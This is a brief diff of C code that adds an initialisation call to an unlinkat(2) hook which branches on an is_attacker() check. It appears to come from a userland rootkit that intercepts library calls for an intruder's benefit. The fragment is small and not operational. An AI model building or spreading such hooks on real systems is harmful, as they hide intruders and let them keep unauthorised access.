@@ -25,6 +25,7 @@
 #include "hooks.h" /* prototype */
 
 int unlinkat(int dirfd, const char *pathname, int flags) {
+    init();
     DEBUG(D_INFO, "called unlinkat(2) hook");
 
     if (is_attacker())
